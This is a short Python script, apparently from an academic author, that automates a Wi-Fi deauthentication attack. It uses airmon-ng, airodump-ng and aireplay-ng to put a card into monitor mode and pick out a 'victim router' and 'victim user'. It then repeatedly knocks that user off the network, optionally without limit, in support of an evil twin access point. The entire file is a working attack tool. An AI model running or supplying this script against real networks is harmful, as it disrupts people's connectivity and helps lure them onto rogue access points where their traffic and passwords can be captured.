#! /usr/bin/env python3
from os import system
from termcolor import colored
from time import sleep

""" The author is Hao Wu,
    If you have any question, Please
    contact hao.wu81@du.edu, it is an academic e-mail.
    Thank You. """


def config_wireless_card(wireless_card):
    """This function is used to configure wireless card to monitor and turn on it """
    system('sudo airmon-ng check kill')
    system('sudo airmon-ng start {0}'.format(wireless_card))
    wireless_card += 'mon'
    system('sudo ifconfig {0} down'.format(wireless_card))
    system('sudo iwconfig {0} mode monitor'.format(wireless_card))
    system('sudo ifconfig {0} up'.format(wireless_card))
    print(colored('\nYour configuration are all set!', 'green'))


def scan_and_atatck(wireless_card):
    """This function is used to scan the nearby wireless network and record MAC address,
    then run the attack mission"""
    print(colored('\nWe will start Wi-Fi scan, please enter ctrl+c when you see the victim router(BSSID)', 'green'))
    sleep(5)
    system('sudo airodump-ng {0}'.format(wireless_card))
    Router_MAC = input(colored('\nPlease enter the router MAC address here(BSSID):', 'blue'))
    Channel = input(colored('\nPlease enter the router Channel here(CH):', 'blue'))
    print(colored('\nWe will start Wi-Fi scan, please enter ctrl+c when you see the victim user(STATION)', 'green'))
    sleep(5)
    system('sudo airodump-ng {0} --bssid {1}'.format(wireless_card, Router_MAC))
    User_MAC = input(colored('\nPlease enter the user MAC address here(STATION):', 'blue'))
    system('airmon-ng start {0} {1}'.format(wireless_card, Channel))
    print(colored('\nYour scan tasks are all set!', 'green'))
    attack_num = input(colored('How many times attacl do you want 0 is unlimit ','blue'))
    deauth = 'aireplay-ng -0 {3} -a {0} -c {1} {2}'.\
              format(Router_MAC, User_MAC,wireless_card,attack_num)
    print(colored('\nPlease enter ctrl+c when you want to stop this attack', 'green'))
    sleep(5)
    system(deauth)
    while True:
        print(colored('\nPlease enter ctrl+c when you ensure the victim user is already dead', 'green'))
        sleep(5)
        Evil_twin=input(colored('\nAre you running Evil_twin? Y/N ','blue'))
        if Evil_twin == 'Y':
            trigger = input(colored('Have the victim connected to you? Y/N ', 'blue'))
        elif Evil_twin == 'N':
            system('sudo airodump-ng {0} --bssid {1}'.format(wireless_card, Router_MAC))
            trigger = input(colored('Is the victim user dead? Y/N ', 'blue'))
        if trigger == 'Y':
            break
        elif trigger == 'N':
            print(colored('\nPlease enter ctrl+c when you want to stop this attack', 'green'))
            system('airmon-ng start {0} {1}'.format(wireless_card, Channel))
            sleep(5)
            system(deauth)


def main():
    """Main is just main function"""
    system('sudo iwconfig')
    sleep(5)
    wireless_card = input(colored('\nWhich wireless card you want to use?\n'
                                  'Hint: You should check your wireless card status if'
                                  ' no insight: ', 'blue'))
    Status =input(colored('\nDo you want to initialize? If you have initialized, don\'t choose Y.'
                          ' Y/N ','blue'))
    if Status == 'Y':
        config_wireless_card(wireless_card)
        wireless_card += 'mon'
    garbage = input(colored('\nIf you want to run evil_twin,'
                            'do it now. Enter something to continue: ','blue'))
    scan_and_atatck(wireless_card)
    exit(0)
if __name__ == '__main__':
    main()
